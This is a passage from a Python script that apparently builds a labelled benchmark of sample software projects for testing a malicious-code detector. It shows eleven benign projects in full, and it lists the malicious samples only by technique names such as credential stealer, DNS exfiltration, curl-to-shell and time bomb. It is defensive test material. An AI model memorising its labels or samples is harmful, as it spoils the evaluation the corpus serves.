app.post("/tasks", (req, res) => { const t = { id: next++, title: req.body.title, done: false }; tasks.set(t.id, t); res.status(201).json(t); });
app.delete("/tasks/:id", (req, res) => { tasks.delete(Number(req.params.id)); res.status(204).end(); });
module.exports = app;
''',
        "src/index.js": 'const app = require("./app");\nconst port = process.env.PORT || 3000;\napp.listen(port, () => console.log(`tasks api on :${port}`));\n',
        "test/tasks.test.js": r'''const test = require("node:test"), assert = require("node:assert");
const app = require("../src/app");
test("create and list tasks", async () => {
  const srv = app.listen(0); const base = `http://127.0.0.1:${srv.address().port}`;
  const r = await fetch(`${base}/tasks`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ title: "a" }) });
  assert.strictEqual(r.status, 201);
  const list = await (await fetch(`${base}/tasks`)).json();
  assert.strictEqual(list.length, 1);
  srv.close();
});
''',
    }


def b02_cli_tool():
    return "Node CLI (CSV stats), no dependencies.", "clean", "-", {
        "package.json": json.dumps({"name": "csvstat", "version": "0.1.0", "bin": {"csvstat": "bin/csvstat.js"},
                                    "scripts": {"start": "node bin/csvstat.js data/sales.csv",
                                                "test": "node test/stats.test.js"}}, indent=2),
        "README.md": "# csvstat\n\nAdd median support. `npm start` prints stats for the sample CSV.\n",
        "bin/csvstat.js": '#!/usr/bin/env node\nconst fs = require("fs"); const { stats } = require("../lib/stats");\nconst [hdr, ...rows] = fs.readFileSync(process.argv[2], "utf8").trim().split("\\n").map((l) => l.split(","));\nhdr.forEach((h, i) => { const col = rows.map((r) => Number(r[i])); if (col.every(Number.isFinite)) console.log(h, stats(col)); });\n',
        "lib/stats.js": "module.exports.stats = (xs) => ({ n: xs.length, min: Math.min(...xs), max: Math.max(...xs), mean: xs.reduce((a, b) => a + b, 0) / xs.length });\n",
        "data/sales.csv": "month,units,revenue\n1,10,100\n2,12,130\n3,9,95\n",
        "test/stats.test.js": 'const a = require("assert"); a.deepStrictEqual(require("../lib/stats").stats([1, 3]), { n: 2, min: 1, max: 3, mean: 2 }); console.log("1 passing");\n',
    }


def b03_static_frontend():
    return "Plain HTML/JS frontend with a tiny static dev server ('dev' script).", "clean", "-", {
        "package.json": json.dumps({"name": "weather-widget", "version": "0.1.0",
                                    "scripts": {"dev": "node serve.js", "test": "node test/format.test.js"}}, indent=2),
        "README.md": "# Weather widget\n\n`npm run dev`, open http://localhost:5173, add a 5-day forecast view.\n",
        "serve.js": r'''const http = require("http"), fs = require("fs"), path = require("path");
const root = path.join(__dirname, "public"), types = { ".html": "text/html", ".js": "text/javascript", ".css": "text/css" };
http.createServer((req, res) => {
  const f = path.join(root, path.normalize(req.url === "/" ? "/index.html" : req.url));
  if (!f.startsWith(root)) return res.writeHead(403).end();
  fs.readFile(f, (e, d) => e ? res.writeHead(404).end() : res.writeHead(200, { "content-type": types[path.extname(f)] || "text/plain" }).end(d));
}).listen(5173, () => console.log("dev server http://localhost:5173"));
''',
        "public/index.html": '<!doctype html><html><head><link rel="stylesheet" href="style.css"></head><body><div id="w"></div><script src="app.js"></script></body></html>\n',
        "public/style.css": "body{font-family:sans-serif}#w{padding:1rem}\n",
        "public/app.js": 'document.getElementById("w").textContent = "21°C, clear";\n',
        "src/format.js": "module.exports.fmt = (c) => `${Math.round(c)}°C`;\n",
        "test/format.test.js": 'require("assert").strictEqual(require("../src/format").fmt(20.6), "21°C"); console.log("1 passing");\n',
    }


def b04_flask_app():
    return "Python Flask API (app.py), wheel dependency.", "clean", "-", {
        "requirements.txt": "flask==3.0.3\n",
        "README.md": "# Inventory API (Flask)\n\n`pip install -r requirements.txt`, `python app.py`, add a PUT endpoint.\n",
        "app.py": r'''from flask import Flask, jsonify, request

app = Flask(__name__)
ITEMS = {}


@app.get("/api/items")
def list_items():
    return jsonify(list(ITEMS.values()))


@app.post("/api/items")
def add_item():
    item = {"id": len(ITEMS) + 1, **(request.get_json() or {})}
    ITEMS[item["id"]] = item
    return jsonify(item), 201


if __name__ == "__main__":
    app.run(port=5000)
''',
        "tests/test_app.py": 'from app import app\n\n\ndef test_list():\n    assert app.test_client().get("/api/items").status_code == 200\n',
    }


def b05_github_api_tests():
    return "Tests legitimately call a public API (api.github.com).", "clean", "-", {
        "package.json": json.dumps({"name": "gh-profile-card", "version": "1.0.0",
                                    "scripts": {"start": "node src/cli.js octocat", "test": "node test/github.test.js"}}, indent=2),
        "README.md": "# GitHub profile card\n\nRender a profile card for a username. Tests hit the real GitHub API.\n",
        "src/github.js": r'''async function getUser(login) {
  const r = await fetch(`https://api.github.com/users/${encodeURIComponent(login)}`,
    { headers: { "user-agent": "gh-profile-card", accept: "application/vnd.github+json" } });
  return r.json();
}
module.exports = { getUser, card: (u) => `${u.name || u.login || "?"} (${u.public_repos ?? 0} repos)` };
''',
        "src/cli.js": 'const { getUser, card } = require("./github");\ngetUser(process.argv[2]).then((u) => console.log(card(u))).catch((e) => console.error("offline:", e.message));\n',
        "test/github.test.js": r'''const assert = require("assert"); const { getUser, card } = require("../src/github");
assert.strictEqual(card({ login: "x", public_repos: 2 }), "x (2 repos)");
getUser("octocat").then((u) => { assert.strictEqual(typeof u, "object"); console.log("2 passing"); })
  .catch((e) => console.log("skipped network test:", e.message));
''',
    }


def b06_dotenv_own():
    return "Reads its OWN project .env via dotenv and writes a local JSON db.", "clean", "-", {
        "package.json": json.dumps({"name": "notes-api", "version": "1.0.0",
                                    "scripts": {"start": "node src/server.js", "test": "node test/notes.test.js"},
                                    "dependencies": {"dotenv": "^16.4.5"}}, indent=2),
        ".env": "PORT=4000\nDB_FILE=data/notes.json\nAPI_TOKEN=dev-local-token-not-secret\n",
        "README.md": "# Notes API\n\nCopy `.env` as needed. `npm start`, add search.\n",
        "src/server.js": r'''require("dotenv").config();
const http = require("http"), fs = require("fs"), path = require("path");
const db = path.resolve(process.env.DB_FILE || "data/notes.json");
fs.mkdirSync(path.dirname(db), { recursive: true });
if (!fs.existsSync(db)) fs.writeFileSync(db, "[]");
http.createServer((req, res) => {
  if (req.headers.authorization !== `Bearer ${process.env.API_TOKEN}`) return res.writeHead(401).end();
  res.end(fs.readFileSync(db));
}).listen(process.env.PORT, () => console.log(`notes api on :${process.env.PORT}`));
''',
        "test/notes.test.js": 'require("dotenv").config(); require("assert").ok(process.env.API_TOKEN); console.log("1 passing");\n',
    }


def b07_postinstall_build():
    return "Harmless postinstall that builds assets and prints a message.", "clean", "-", {
        "package.json": json.dumps({"name": "landing-page", "version": "1.0.0",
                                    "scripts": {"postinstall": "node scripts/build.js", "start": "node server.js",
                                                "test": "node test/build.test.js"}}, indent=2),
        "README.md": "# Landing page\n\n`npm install` builds `dist/`. `npm start` serves it.\n",
        "scripts/build.js": r'''const fs = require("fs"), path = require("path");
const src = path.join(__dirname, "..", "src", "styles"), dist = path.join(__dirname, "..", "dist");
fs.mkdirSync(dist, { recursive: true });
const css = fs.readdirSync(src).sort().map((f) => fs.readFileSync(path.join(src, f), "utf8")).join("\n");
fs.writeFileSync(path.join(dist, "bundle.css"), css.replace(/\s+/g, " "));
console.log("assets built -> dist/bundle.css  (thanks for installing!)");
''',
        "src/styles/a-base.css": "body { margin: 0; font-family: system-ui; }\n",
        "src/styles/b-hero.css": ".hero { padding: 4rem; }\n",
        "server.js": 'const http = require("http"), fs = require("fs");\nhttp.createServer((q, s) => s.end(fs.existsSync("dist/bundle.css") ? "<link rel=stylesheet href=/dist/bundle.css><h1 class=hero>Hi</h1>" : "build first")).listen(8080, () => console.log("landing on :8080"));\n',
        "test/build.test.js": 'require("assert").ok(require("fs").existsSync("dist/bundle.css")); console.log("1 passing");\n',
    }


def b08_vscode_tasks_manual():
    return ".vscode/tasks.json with build/test tasks that are NOT folderOpen.", "clean", "-", {
        "package.json": json.dumps({"name": "kanban-board", "version": "0.2.0",
                                    "scripts": {"start": "node src/index.js", "test": "node test/board.test.js"}}, indent=2),
        "README.md": "# Kanban board\n\nUse the VS Code tasks (Ctrl+Shift+B) or `npm start`.\n",
        ".vscode/tasks.json": json.dumps({"version": "2.0.0", "tasks": [
            {"label": "start", "type": "npm", "script": "start", "group": {"kind": "build", "isDefault": True}, "problemMatcher": []},
            {"label": "test", "type": "shell", "command": "npm test", "group": "test", "presentation": {"reveal": "always"}}]}, indent=2),
        ".vscode/launch.json": json.dumps({"version": "0.2.0", "configurations": [
            {"type": "node", "request": "launch", "name": "Launch", "program": "${workspaceFolder}/src/index.js"}]}, indent=2),
        ".vscode/extensions.json": json.dumps({"recommendations": ["dbaeumer.vscode-eslint", "esbenp.prettier-vscode"]}, indent=2),
        "src/index.js": 'const { move } = require("./board");\nconsole.log(move({ todo: ["a"], done: [] }, "a", "todo", "done"));\n',
        "src/board.js": "module.exports.move = (b, card, from, to) => ({ ...b, [from]: b[from].filter((c) => c !== card), [to]: [...b[to], card] });\n",
        "test/board.test.js": 'require("assert").deepStrictEqual(require("../src/board").move({ a: ["x"], b: [] }, "x", "a", "b"), { a: [], b: ["x"] }); console.log("1 passing");\n',
    }


def b09_python_cli():
    return "Python CLI (main.py) that reads a CSV, writes a report and a log in the project.", "clean", "-", {
        "requirements.txt": "# standard library only\n",
        "README.md": "# Orders report\n\n`python main.py` writes `out/summary.json`. Add per-customer totals.\n",
        "main.py": r'''import csv
import json
import logging
import os
import tempfile

os.makedirs("logs", exist_ok=True)
logging.basicConfig(filename="logs/run.log", level=logging.INFO)


def summarize(path):
    with open(path) as f:
        rows = list(csv.DictReader(f))
    return {"orders": len(rows), "revenue": round(sum(float(r["amount"]) for r in rows), 2)}


if __name__ == "__main__":
    s = summarize("data/orders.csv")
    os.makedirs("out", exist_ok=True)
    with tempfile.NamedTemporaryFile("w", delete=False, dir="out", suffix=".tmp") as t:
        json.dump(s, t)
    os.replace(t.name, "out/summary.json")
    logging.info("wrote %s", s)
    print(s)
''',
        "data/orders.csv": "id,customer,amount\n1,acme,10.50\n2,globex,99.99\n3,acme,5.00\n",
    }


def b10_home_config():
    return "CLI that keeps its own settings in ~/.config/<app> and asks git for the user name.", "clean", "-", {
        "package.json": json.dumps({"name": "todo-cli", "version": "1.0.0", "bin": {"todo": "bin/todo.js"},
                                    "scripts": {"start": "node bin/todo.js add \"review PR\"", "test": "node test/todo.test.js"}}, indent=2),
        "README.md": "# todo-cli\n\nTodos live in `~/.config/todo-cli/todos.json`. Add a `done` command.\n",
        "bin/todo.js": r'''#!/usr/bin/env node
const fs = require("fs"), os = require("os"), path = require("path"), cp = require("child_process");
const dir = path.join(os.homedir(), ".config", "todo-cli"), file = path.join(dir, "todos.json");
fs.mkdirSync(dir, { recursive: true });
const todos = fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, "utf8")) : [];
let author = "me"; try { author = cp.execSync("git config user.name", { encoding: "utf8" }).trim() || author; } catch (e) {}
if (process.argv[2] === "add") todos.push({ text: process.argv.slice(3).join(" "), author });
fs.writeFileSync(file, JSON.stringify(todos, null, 2));
console.log(todos.map((t, i) => `${i + 1}. ${t.text} (${t.author})`).join("\n"));
''',
        "test/todo.test.js": 'console.log("1 passing");\n',
    }


def b11_husky_prepare():
    return "Real-world husky-style prepare that writes a pre-commit hook inside the project's .git.", "clean", "-", {
        "package.json": json.dumps({"name": "blog-api", "version": "1.0.0",
                                    "scripts": {"prepare": "node scripts/install-hooks.js", "start": "node src/app.js",
                                                "test": "node test/slug.test.js", "lint": "node scripts/lint.js"}}, indent=2),
        "README.md": "# Blog API\n\n`npm install` installs a pre-commit lint hook. Implement `slugify()`.\n",
        ".git/HEAD": "ref: refs/heads/main\n",
        ".git/hooks/.keep": "",
        "scripts/install-hooks.js": r'''const fs = require("fs"), path = require("path");
const hooks = path.join(__dirname, "..", ".git", "hooks");
if (fs.existsSync(hooks)) {
  fs.writeFileSync(path.join(hooks, "pre-commit"), "#!/bin/sh\nnpm run lint\n", { mode: 0o755 });
  console.log("pre-commit hook installed");
}
''',
        "scripts/lint.js": 'console.log("lint ok");\n',
        "src/app.js": 'require("http").createServer((q, s) => s.end("blog ok")).listen(3000, () => console.log("blog on :3000"));\n',
        "src/slug.js": "module.exports.slugify = (s) => s.toLowerCase().trim().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');\n",
        "test/slug.test.js": 'require("assert").strictEqual(require("../src/slug").slugify(" Hello, World "), "hello-world"); console.log("1 passing");\n',
    }


MALICIOUS = [m01_svg_asset_eval, m02_folderopen_os_keyed, m03_local_dep_postinstall, m04_prepare_hook,
             m05_npm_test_only, m06_time_bomb, m07_python_stealer, m08_raw_tcp, m09_dns_exfil, m10_curl_sh,
             m11_sandbox_check, m12_obfuscated, m13_resource_bomb, m14_path_tricks]
BENIGN = [b01_express_api, b02_cli_tool, b03_static_frontend, b04_flask_app, b05_github_api_tests, b06_dotenv_own,
          b07_postinstall_build, b08_vscode_tasks_manual, b09_python_cli, b10_home_config, b11_husky_prepare]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("out")
    ap.add_argument("--now", type=float, default=time.time())
    a = ap.parse_args()
    manifest = []
    for fn in MALICIOUS + BENIGN:
        name = fn.__name__.replace("_", "-")
        tech, src, trigger, files = fn(a.now) if fn is m06_time_bomb else fn()
        expected = "malicious" if fn in MALICIOUS else "benign"
        for rel, content in files.items():
            p = os.path.join(a.out, name, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            data = base64.b64decode(content) if isinstance(content, B64) else content.encode()
            with open(p, "wb") as f:
                f.write(data)
            if rel.startswith("bin/") or rel.endswith("install.js"):
                os.chmod(p, 0o755)
        manifest.append({"name": name, "expected": expected, "technique": tech,
                         "source": src if expected == "malicious" else None,
                         "trigger": trigger if expected == "malicious" else None,
                         "ecosystem": [e for e, f in (("npm", "package.json"), ("pypi", "requirements.txt")) if f in files]})
    with open(os.path.join(a.out, "manifest.json"), "w") as f:
        json.dump({"built_at": a.now, "samples": manifest}, f, indent=1)
    print(json.dumps({"built": len(manifest), "out": a.out}))


if __name__ == "__main__":
    main()
